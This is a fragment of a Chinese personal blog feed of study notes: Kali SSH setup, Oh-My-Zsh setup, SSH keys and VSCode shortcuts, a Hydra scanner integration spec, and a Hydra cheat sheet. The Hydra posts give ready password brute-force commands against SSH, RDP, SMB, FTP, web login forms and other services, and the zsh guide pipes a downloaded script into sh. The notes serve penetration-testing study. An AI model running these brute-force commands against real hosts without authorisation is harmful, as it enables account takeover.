yes···PasswordAuthentication yes</code></pre></div><p>启动服务并设为开机启动：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">service ssh restartupdate-rc.d ssh enable</code></pre></div><h2 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h2><p>在<code>优化</code>中，可以选择<a href="https://www.gnome-look.org/p/1013714">主题</a>和<a href="https://www.opendesktop.org/p/1305429/">图标</a>等。放于<code>/usr/share/themes</code>与<code>/usr/share/icons</code>文件夹下可直接使用。</p><blockquote><p>参考：</p><p><a href="https://www.zhihu.com/question/64374670/answer/1354272784">https://www.zhihu.com/question/64374670/answer/1354272784</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Ubuntu</tag>
      
      <tag>Kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu下zsh及Oh-My-Zsh设置</title>
    <link href="/posts/b6373879/"/>
    <url>/posts/b6373879/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Z shell（Zsh）是一款可用作交互式登录的shell及脚本编写的命令解释器。内置于Ubuntu与OSX中，功能强大。</p><p>Oh My Zsh是一个开源的的框架，用于管理你的Zsh配置。有很多主题与扩展。</p></blockquote><h2 id="安装Zsh"><a href="#安装Zsh" class="headerlink" title="安装Zsh"></a>安装Zsh</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 查看系统已有shellcat &#x2F;etc&#x2F;shells# 查看当前默认的 Shellecho $SHELL # 安装zsh（Ubuntu与OSX内置有）sudo apt install zsh# 将 Zsh 设置为默认 Shell（chsh-change shell）chsh -s &#x2F;bin&#x2F;zsh# 重启 Shell（reboot）。</code></pre></div><h2 id="安装-Oh-My-Zsh"><a href="#安装-Oh-My-Zsh" class="headerlink" title="安装 Oh My Zsh"></a>安装 Oh My Zsh</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 安装Oh My Zshwget https:&#x2F;&#x2F;github.com&#x2F;robbyrussell&#x2F;oh-my-zsh&#x2F;raw&#x2F;master&#x2F;tools&#x2F;install.sh -O - | sh</code></pre></div><p>出现如下界面则安装成功。安装于默认<code>.oh-my-zsh</code>。</p><div class="code-wrapper"><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">__                                     __     ____  &#x2F; &#x2F;_     ____ ___  __  __   ____  _____&#x2F; &#x2F;_   &#x2F; __ \&#x2F; __ \   &#x2F; __ &#96;__ \&#x2F; &#x2F; &#x2F; &#x2F;  &#x2F;_  &#x2F; &#x2F; ___&#x2F; __ \ &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F; &#x2F; &#x2F;  &#x2F; &#x2F; &#x2F; &#x2F; &#x2F; &#x2F; &#x2F;_&#x2F; &#x2F;    &#x2F; &#x2F;_(__  ) &#x2F; &#x2F; &#x2F; \____&#x2F;_&#x2F; &#x2F;_&#x2F;  &#x2F;_&#x2F; &#x2F;_&#x2F; &#x2F;_&#x2F;\__, &#x2F;    &#x2F;___&#x2F;____&#x2F;_&#x2F; &#x2F;_&#x2F;                          &#x2F;____&#x2F;                       ....is now installed!Please look over the ~&#x2F;.zshrc file to select plugins, themes, and options.p.s. Follow us at https:&#x2F;&#x2F;twitter.com&#x2F;ohmyzsh.p.p.s. Get stickers and t-shirts at http:&#x2F;&#x2F;shop.planetargon.com.</code></pre></div><h2 id="Zsh配置"><a href="#Zsh配置" class="headerlink" title="Zsh配置"></a>Zsh配置</h2><h3 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h3><p><a href="https://github.com/ohmyzsh/ohmyzsh/wiki/themes">Oh My Zsh主题</a>较多，默认使用的是<em>robbyrussell</em>，<em>agnoster</em>也比较不错。内置主题位于<code>~/.oh-my-zsh/themes</code>中，其他的主题也可下载在此处，在配置文件中直接启用。主题文件可直接打开编辑，重新source配置文件即可生效。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 编辑配置文件修改主题vim ~&#x2F;.zshrc# 修改其中的内容ZSH_THEME&#x3D;&quot;agnoster&quot;</code></pre></div><p>使用<em>agnoster</em>主题出现乱码，可通过安装解决字体问题。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo apt-get install powerline fonts-powerline</code></pre></div><h3 id="插件配置"><a href="#插件配置" class="headerlink" title="插件配置"></a>插件配置</h3><p><a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Plugins">Oh My Zsh插件</a>，内置很多插件位于<code>/.oh-my-zsh/plugins</code>。可在<code>~/.zshrc</code>中的<code>plugins</code>直接配置打开。</p><p>同时额外装了几个常用的插件。可置于<code>~/.oh-my-zsh/custom/plugins</code>中便于管理。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 安装 zsh-autosuggestions# 命令行命令键入时的历史命令建议插件git clone https:&#x2F;&#x2F;github.com&#x2F;zsh-users&#x2F;zsh-autosuggestions $&#123;ZSH_CUSTOM:-~&#x2F;.oh-my-zsh&#x2F;custom&#125;&#x2F;plugins&#x2F;zsh-autosuggestions# 安装 zsh-syntax-highlighting# 命令行语法高亮插件git clone https:&#x2F;&#x2F;github.com&#x2F;zsh-users&#x2F;zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~&#x2F;.oh-my-zsh&#x2F;custom&#125;&#x2F;plugins&#x2F;zsh-syntax-highlightingecho &quot;source $&#123;(q-)PWD&#125;&#x2F;zsh-syntax-highlighting&#x2F;zsh-syntax-highlighting.zsh&quot; &gt;&gt; $&#123;ZDOTDIR:-$HOME&#125;&#x2F;.zshrc</code></pre></div><p>修改配置文件<code>vim ~/.zshrc</code>。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 最好把zsh-syntax-highlighting放在最后source &#x2F;opt&#x2F;z&#x2F;z.shsource ~&#x2F;.oh-my-zsh&#x2F;custom&#x2F;plugins&#x2F;zsh-syntax-highlighting&#x2F;zsh-syntax-highlighting.zshplugins&#x3D;(  git extract zsh-autosuggestions z zsh-syntax-highlighting)</code></pre></div><ul><li>z 是一个相当实用的 cd 命令增强脚本（记录你的cd使用习惯 通过z命令模糊匹配）</li></ul><blockquote><p>若未安装zsh，在源码仓库里可以看到，<strong>Z</strong> 其实也就是一个 <strong>.sh</strong> 脚本，所以不管你用的是什么Terminal，只用按以下步骤就能马上使用 <strong>Z</strong> 。</p><ol><li>将<a href="https://github.com/rupa/z/blob/master/z.sh">z.sh</a>下载到本地目录</li><li>在根目录对应Terminal的文件（如果是默认的，一般是.bashrc）里加上<code>source</code>和z.sh所在目录</li><li>之后重启Terminal就可以开始用了</li></ol></blockquote><ul><li>extract是功能强大的解压插件，所有类型的文件解压一个命令x全搞定参考：</li></ul><blockquote><p><a href="https://juejin.im/post/6844903620333289486">https://juejin.im/post/6844903620333289486</a></p><p><a href="https://www.jianshu.com/p/fa82d932888b">https://www.jianshu.com/p/fa82d932888b</a></p><p><a href="https://linuxtoy.org/archives/z.html">https://linuxtoy.org/archives/z.html</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Shell</tag>
      
      <tag>Zsh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux SSH免密认证密钥配置及VSCode-SSH配置</title>
    <link href="/posts/28830640/"/>
    <url>/posts/28830640/</url>
    
    <content type="html"><![CDATA[<blockquote><p>记录一下Linux的SSH免密配置，以及在VSCode上配置SSH以映射文件，编辑远端文档。</p><p>至于为什么转投VSCode，Ayu Light主题配色实在是太好看了。</p></blockquote><h2 id="SSH公私钥配置"><a href="#SSH公私钥配置" class="headerlink" title="SSH公私钥配置"></a>SSH公私钥配置</h2><blockquote><p>SSH使用方便且安全，公私钥均有本地生成，公钥存放至服务器端即可</p></blockquote><h3 id="生成密钥ssh-keygen"><a href="#生成密钥ssh-keygen" class="headerlink" title="生成密钥ssh-keygen"></a>生成密钥<code>ssh-keygen</code></h3><p>样例：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen -t rsa -f aliyun_ssh -C &quot;备注&quot;</code></pre></div><table><thead><tr><th>参数</th><th align="left">使用</th></tr></thead><tbody><tr><td>-f</td><td align="left">生成文件名</td></tr><tr><td>-t</td><td align="left">采用rsa加密方式,t=type</td></tr><tr><td>-b</td><td align="left">采用长度1024bit的密钥对,b=bits,最长4096</td></tr><tr><td>-C</td><td align="left">备注</td></tr></tbody></table><p>如果该命令是在<code>~/.ssh</code>目录下执行，执行后~/.ssh目录对多出<code>aliyun_ssh</code>和<code>aliyun_ssh.pub</code>两个文件。</p><p>有pub后缀的文件为公钥，没有pub后缀的文件为私钥。</p><h3 id="配置公钥ssh-copy-id"><a href="#配置公钥ssh-copy-id" class="headerlink" title="配置公钥ssh-copy-id"></a>配置公钥<code>ssh-copy-id</code></h3><p>样例：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-copy-id -i ~&#x2F;.ssh&#x2F;aliyun_ssh.pub root@2.2.2.2</code></pre></div><p><code>-i</code> (identity_file认证文件)，其实是通过ssh将公钥写入远程服务器的<code>~/ .ssh/authorized_key</code>中（向后添加）。通过文本的复制效果相同。</p><blockquote><p>注：<strong>需要服务器端的~/ .ssh/authorized_key文件具有600权限！</strong></p></blockquote><h3 id="本地SSH配置"><a href="#本地SSH配置" class="headerlink" title="本地SSH配置"></a>本地SSH配置</h3><p>配置格式简单如下：</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">Host 10.211.1.1  HostName 10.211.1.1  User rootHost aliyun-2.2.2.2  HostName 2.2.2.2  User root  IdentityFile ~&#x2F;.ssh&#x2F;aliyun_ssh</code></pre></div><p>其中<strong>Host</strong>是自己备注的名字，<strong>HostName</strong>即服务器IP，<strong>User</strong>为登录用户。</p><p>如果使用SSH公私钥登录则需要配置<strong>IdentityFile</strong>指向本地存放的私钥。</p><p>登录时即可备注的名字快速登录(支持tab补全)</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh aliyun-2.2.2.2</code></pre></div><h2 id="配置VSCode-Remote-SSH"><a href="#配置VSCode-Remote-SSH" class="headerlink" title="配置VSCode Remote - SSH"></a>配置VSCode Remote - SSH</h2><p>直接在VSCode安装Remote - SSH扩展即可。</p><p><img src="/image/Linux-SSH%E5%85%8D%E5%AF%86%E8%AE%A4%E8%AF%81%E5%AF%86%E9%92%A5%E9%85%8D%E7%BD%AE%E5%8F%8AVSCode-SSH%E9%85%8D%E7%BD%AE/remotessh.png"></p><p>安装完后会在侧边栏和左下角出现相应的扩展栏。</p><p><img src="/image/Linux-SSH%E5%85%8D%E5%AF%86%E8%AE%A4%E8%AF%81%E5%AF%86%E9%92%A5%E9%85%8D%E7%BD%AE%E5%8F%8AVSCode-SSH%E9%85%8D%E7%BD%AE/sidebar.png"></p><p>可根据系统ssh-config进行连接，即可快速在本地编辑远端文本。</p><h2 id="VSCode快捷键"><a href="#VSCode快捷键" class="headerlink" title="VSCode快捷键"></a>VSCode快捷键</h2><blockquote><p>最后记录一些常用的快捷键</p></blockquote><h3 id="全局"><a href="#全局" class="headerlink" title="全局"></a>全局</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Command + Shift + P &#x2F; F1 显示命令面板Command + P 快速打开Command + Shift + N 打开新窗口Command + W 关闭窗口</code></pre></div><h3 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Command + X 剪切（未选中文本的情况下，剪切光标所在行）Command + C 复制（未选中文本的情况下，复制光标所在行）Option + Up 向上移动行Option + Down 向下移动行Option + Shift + Up 向上复制行Option + Shift + Down 向下复制行Command + Shift + K 删除行Command + Enter 下一行插入Command + Shift + Enter 上一行插入Command + Shift + \ 跳转到匹配的括号Command + [ 减少缩进Command + ] 增加缩进Home 跳转至行首End 跳转到行尾Command + Up 跳转至文件开头Command + Down 跳转至文件结尾Ctrl + PgUp 按行向上滚动Ctrl + PgDown 按行向下滚动Command + PgUp 按屏向上滚动Command + PgDown 按屏向下滚动Command + Shift + [ 折叠代码块Command + Shift + ] 展开代码块Command + K Command + [ 折叠全部子代码块Command + K Command + ] 展开全部子代码块Command + K Command + 0 折叠全部代码块Command + K Command + J 展开全部代码块Command + K Command + C 添加行注释Command + K Command + U 移除行注释Command + &#x2F; 添加、移除行注释Option + Shift + A 添加、移除块注释Option + Z 自动换行、取消自动换行</code></pre></div><h3 id="多光标与选择"><a href="#多光标与选择" class="headerlink" title="多光标与选择"></a>多光标与选择</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Option + 点击 插入多个光标Command + Option + Up 向上插入光标Command + Option + Down 向下插入光标Command + U 撤销上一个光标操作Option + Shift + I 在所选行的行尾插入光标Command + I 选中当前行Command + Shift + L 选中所有与当前选中内容相同部分Command + F2 选中所有与当前选中单词相同的单词Command + Ctrl + Shift + Left 折叠选中Command + Ctrl + Shift + Right 展开选中Alt + Shift + 拖动鼠标 选中代码块Command + Shift + Option + Up 列选择 向上Command + Shift + Option + Down 列选择 向下Command + Shift + Option + Left 列选择 向左Command + Shift + Option + Right 列选择 向右Command + Shift + Option + PgUp 列选择 向上翻页Command + Shift + Option + PgDown 列选择 向下翻页</code></pre></div><h3 id="查找替换"><a href="#查找替换" class="headerlink" title="查找替换"></a>查找替换</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Command + F 查找Command + Option + F 替换Command + G 查找下一个Command + Shift + G 查找上一个Option + Enter 选中所有匹配项Command + D 向下选中相同内容Command + K Command + D 移除前一个向下选中相同内容</code></pre></div><h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ctrl + Space 打开建议Command + Shift + Space 参数提示Tab Emmet插件缩写补全Option + Shift + F 格式化Command + K Command + F 格式化选中内容F12 跳转到声明位置Option + F12 查看具体声明内容Command + K F12 分屏查看具体声明内容Command + . 快速修复Shift + F12 显示引用F2 重命名符号Command + Shift + . 替换为上一个值Command + Shift + , 替换为下一个值Command + K Command + X 删除行尾多余空格Command + K M 更改文件语言</code></pre></div><h3 id="导航"><a href="#导航" class="headerlink" title="导航"></a>导航</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Command + T 显示所有符号Ctrl + G 跳转至某行Command + P 跳转到某个文件Command + Shift + O 跳转到某个符号Command + Shift + M 打开问题面板F8 下一个错误或警告位置Shift + F8 上一个错误或警告位置Ctrl + Shift + Tab 编辑器历史记录Ctrl + - 后退Ctrl + Shift + - 前进Ctrl + Shift + M Tab 切换焦点</code></pre></div><h3 id="编辑器管理"><a href="#编辑器管理" class="headerlink" title="编辑器管理"></a>编辑器管理</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Command + W 关闭编辑器Command + K F 关闭文件夹Command + \ 编辑器分屏Command + 1 切换到第一分组Command + 2 切换到第二分组Command + 3 切换到第三分组Command + K Command + Left 切换到上一分组Command + K Command + Right 切换到下一分组Command + K Command + Shift + Left 左移编辑器Command + K Command + Shift + Right 右移编辑器Command + K Left 激活左侧编辑组Command + K Right 激活右侧编辑组</code></pre></div><h3 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Command + N 新建文件Command + O 打开文件Command + S 保存文件Command + Shift + S 另存为Command + Option + S 全部保存Command + W 关闭Command + K Command + W 全部关闭Command + Shift + T 重新打开被关闭的编辑器Command + K Enter 保持打开Ctrl + Tab 打开下一个Ctrl + Shift + Tab 打开上一个Command + K P 复制当前文件路径Command + K R 在资源管理器中查看当前文件Command + K O 新窗口打开当前文件</code></pre></div><h3 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Command + Ctrl + F 全屏、退出全屏Command + Option + 1 切换编辑器分屏方式（横、竖）Command + + 放大Command + - 缩小Command + B 显示、隐藏侧边栏Command + Shift + E 显示资源管理器 或 切换焦点Command + Shift + F 显示搜索框Ctrl + Shift + G 显示Git面板Command + Shift + D 显示调试面板Command + Shift + X 显示插件面板Command + Shift + H 全局搜索替换Command + Shift + J 显示、隐藏高级搜索Command + Shift + C 打开新终端Command + Shift + U 显示输出面板Command + Shift + V Markdown预览窗口Command + K V 分屏显示 Markdown预览窗口</code></pre></div><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">F9 设置 或 取消断点F5 开始 或 继续F11 进入Shift + F11 跳出F10 跳过Command + K Command + I 显示悬停信息</code></pre></div><h3 id="集成终端"><a href="#集成终端" class="headerlink" title="集成终端"></a>集成终端</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ctrl + &#96; 显示终端Ctrl + Shift + &#96; 新建终端Command + Up 向上滚动Command + Down 向下滚动PgUp 向上翻页PgDown 向下翻页Command + Home 滚动到顶部Command + End 滚动到底部</code></pre></div><blockquote><p>参考：</p><p><a href="https://www.jianshu.com/p/dd053c18e5ee">https://www.jianshu.com/p/dd053c18e5ee</a></p><p><a href="https://segmentfault.com/a/1190000012811886">https://segmentfault.com/a/1190000012811886</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>SSH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hydra开发说明</title>
    <link href="/posts/34a2c706/"/>
    <url>/posts/34a2c706/</url>
    
    <content type="html"><![CDATA[<blockquote><p>hydra工具集成进入扫描系统，与WEB开发端结合，通过开发说明明确输入输出格式与业务逻辑。</p></blockquote><h3 id="一、-输入格式"><a href="#一、-输入格式" class="headerlink" title="一、 输入格式"></a>一、 输入格式</h3><ol><li>命令行范式</li></ol><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra [some command line options] TARGET PROTOCOL </code></pre></div><ol start="2"><li>输入内容</li></ol><p>包括<strong>协议选择</strong>，<strong>IP地址与端口指定</strong></p><ul><li>协议（必选项），具有<code>RDP</code>、<code>MYSQL</code>、<code>SSH</code>、<code>TELNET</code>选项</li><li>IP地址（必选项）与端口（可选项），具有输入IP与上传IP地址文件两种模式</li></ul><blockquote><ol><li><p>输入IP模式：支持<code>IP[:port]</code>与<code>CIDR</code>模式(192.168.0.0/24)</p></li><li><p>上传IP地址文件模式：文件一行表示一个地址，格式应为<code>IP[:port]</code>，例：</p></li></ol><p>foo.bar.com<br>target.com:21<br>unusual.port.com:2121<br>default.used.here.com<br>127.0.0.1<br>127.0.0.1:2121</p></blockquote><p><em>（注：后期考虑将其他模块扫描得到的存活主机作为本模块地址参数）</em></p><ol start="3"><li>其他已选相关参数</li></ol><ul><li>-L：指定用户名字典（根据协议选定内置字典）</li><li>-P：指定密码字典（根据协议选定内置字典）</li></ul><p><em>（注：内置字典可置于服务器静态文件中，为行数较多的txt文件）</em></p><ul><li>-e ns：空密码与账密相同探测</li><li>-o：指定输出文件</li><li>-b：指定输出格式（本次选用json）</li></ul><ol start="4"><li>输入示例</li></ol><ul><li>扫描文件地址中的SSH弱口令</li></ul><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -L ssh_login.txt -P ssh_passwd.txt -e ns -o result.json -b json -M IP_addr.txt ssh</code></pre></div><ul><li>扫描指定IP的RDP弱口令</li></ul><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -L rdp_login.txt -P rdp_passwd.txt -e ns -o result.json -b json 127.0.0.1 rdp</code></pre></div><ul><li>扫描文件地址的TELNET弱口令</li></ul><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -L telnet_login.txt -P telnet_passwd.txt -e ns -o result.json -b json -M IP_addr.txt telnet </code></pre></div><ul><li>扫描指定IP的MYSQL弱口令</li></ul><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -L mysql_login.txt -P mysql_passwd.txt -e ns -o result.json -b json 127.0.0.1 mysql</code></pre></div><h3 id="二、输出格式"><a href="#二、输出格式" class="headerlink" title="二、输出格式"></a>二、输出格式</h3><blockquote><p>采用本地缓存json格式，输出文件由-o选项的参数指定。</p></blockquote><p>SSH测试成功样例，扫描记录信息记录在上，结果存于<code>results</code>中。</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">&#123; &quot;generator&quot;: &#123;&quot;software&quot;: &quot;Hydra&quot;, &quot;version&quot;: &quot;v9.1&quot;, &quot;built&quot;: &quot;2020-09-29 15:44:28&quot;,&quot;server&quot;: &quot;127.0.0.1&quot;, &quot;service&quot;: &quot;ssh&quot;, &quot;jsonoutputversion&quot;: &quot;1.00&quot;,&quot;commandline&quot;: &quot;hydra -l root -p root1 -e ns -o b.json -b json 127.0.0.1 ssh&quot;&#125;,&quot;results&quot;: [&#123;&quot;port&quot;: 22, &quot;service&quot;: &quot;ssh&quot;, &quot;host&quot;: &quot;127.0.0.1&quot;, &quot;login&quot;: &quot;root&quot;, &quot;password&quot;: &quot;root&quot;&#125;],&quot;success&quot;: true,&quot;errormessages&quot;: [  ],&quot;quantityfound&quot;: 1   &#125;</code></pre></div><p>为扫描出弱口令则<code>results</code>为空。</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">&#123; &quot;generator&quot;: &#123;&quot;software&quot;: &quot;Hydra&quot;, &quot;version&quot;: &quot;v9.1&quot;, &quot;built&quot;: &quot;2020-09-29 15:44:43&quot;,&quot;server&quot;: &quot;127.0.0.1&quot;, &quot;service&quot;: &quot;ssh&quot;, &quot;jsonoutputversion&quot;: &quot;1.00&quot;,&quot;commandline&quot;: &quot;hydra -l root1 -p root1 -e ns -o b.json -b json 127.0.0.1 ssh&quot;&#125;,&quot;results&quot;: [],&quot;success&quot;: true,&quot;errormessages&quot;: [  ],&quot;quantityfound&quot;: 0   &#125;</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>项目组</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hydra</tag>
      
      <tag>渗透测试</tag>
      
      <tag>弱口令扫描</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hydra用法简记</title>
    <link href="/posts/78d34d76/"/>
    <url>/posts/78d34d76/</url>
    
    <content type="html"><![CDATA[<blockquote><p>hydra是著名黑客组织thc的一款开源的暴力密码破解<a href="https://github.com/vanhauser-thc/thc-hydra">工具</a>,可以在线破解多种密码。</p><p>官网:<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a></p><p>这款暴力密码破解工具相当强大,支持几乎所有协议的在线密码破解,其密码能否被破解关键在于字典是否足够强大。本文仅从安全角度去探讨测试,使用本文内容去做破坏者,与本人无关。</p></blockquote><h3 id="1-指令范式"><a href="#1-指令范式" class="headerlink" title="1.指令范式"></a>1.指令范式</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra [some command line options] [-s PORT] TARGET PROTOCOL [MODULE-OPTIONS]</code></pre></div><h3 id="2-参数选项"><a href="#2-参数选项" class="headerlink" title="2.参数选项"></a>2.参数选项</h3><p>使用option指定参数</p><blockquote><p>-R 根据上一次进度继续破解</p><p>-S 使用SSL协议连接</p><p>-s 指定端口,也可通过ip:port指定端口</p><p>-l 指定用户名</p><p>-L 指定用户名字典(文件)</p><p>-p 指定密码破解</p><p>-P 指定密码字典(文件)</p><p>-e ns 空密码探测和指定用户密码探测,n代表null尝试,代表密码同账户名尝试</p><p>-C 用户名可以用:分割(username:password)可以代替-l username -p password,同时支持该类型下的文件</p><p>-M 指定地址(文件)</p><p>-4/6 指定ipv4或ipv6(默认ipv4)</p><p>-o 输出文件</p><p>-t 指定多线程数量,默认为16个线程</p><p>-vV 显示详细过程</p><p>-f 当账号密码爆破成功时,不再继续进行(通常适用于单用户破解)</p><p>-x min:max:charset 生成密码字典,min最短长度,max最长长度,charset中a代表小写字母,A代表大写字母,1代表数字</p></blockquote><h3 id="3-指定IP"><a href="#3-指定IP" class="headerlink" title="3.指定IP"></a>3.指定IP</h3><ul><li>使用一个独立的IP或者DNS地址</li><li>使用CIDR类型的地址段,例<code>&quot;192.168.0.0/24&quot;</code></li><li>通过文件指定地址(使用参数选项 - M)</li><li>亦可通过新方式指定协议、地址、端口、可选项,例<code>ftp://192.168.33.44:22</code></li></ul><h3 id="4-指定协议"><a href="#4-指定协议" class="headerlink" title="4.指定协议"></a>4.指定协议</h3><p>在target之后指明协议。</p><blockquote><p>目前支持的协议类型有:Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP</p></blockquote><h3 id="5-示例"><a href="#5-示例" class="headerlink" title="5.示例"></a>5.示例</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 破解ssh:hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip sshhydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 破解ftp:hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vVhydra ip ftp -l 用户名 -P 密码字典 -e ns -vV</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># get方式提交,破解web登录:hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get &#x2F;admin&#x2F;hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get &#x2F;admin&#x2F;index.php</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># post方式提交,破解web登录:hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form &#96;&#96;&quot;&#x2F;admin&#x2F;login.php:username&#x3D;^USER^&amp;password&#x3D;^PASS^&amp;submit&#x3D;login:sorry password&quot;</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form &quot;login.php:id&#x3D;^USER^&amp;passwd&#x3D;^PASS^:&lt;title&gt;wrong username or password&lt;&#x2F;title&gt;&quot;# 参数说明:-t同时线程数3,-l用户名是admin,字典pass.txt,保存为out.txt,-f 当破解了一个密码就停止,# 10.36.16.18目标ip,http-post-form表示破解是采用http的post方式提交的表单密码破解,&lt;title&gt;中的内容是表示错误猜解的返回信息提示。</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 破解https:hydra -m &#x2F;index.php -l muts -P pass.txt 10.36.16.18 https</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 破解teamspeak:hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 破解cisco:hydra -P pass.txt 10.36.16.18 ciscohydra -m cloud -P pass.txt 10.36.16.18 cisco-enable</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 破解smb:hydra -l administrator -P pass.txt 10.36.16.18 smb </code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 破解pop3:hydra -l muts -P pass.txt my.pop3.mail pop3</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 破解rdp:hydra ip rdp -l administrator -P pass.txt -V</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 破解http-proxy:hydra -l admin -P pass.txt http-proxy:&#x2F;&#x2F;10.36.16.18</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 破解imap:hydra -L user.txt -p secret 10.36.16.18 imap PLAINhydra -C defaults.txt -6 imap:&#x2F;&#x2F;[fe80::2c:31ff:fe12:ac11]:143&#x2F;PLAIN</code></pre></div><blockquote><p>参考:</p><p><a href="https://github.com/vanhauser-thc/thc-hydra#special-options-for-modules">https://github.com/vanhauser-thc/thc-hydra#special-options-for-modules</a></p><p><a href="http://xstarcd.github.io/wiki/shell/hydra.html">http://xstarcd.github.io/wiki/shell/hydra.html</a></p><p><a 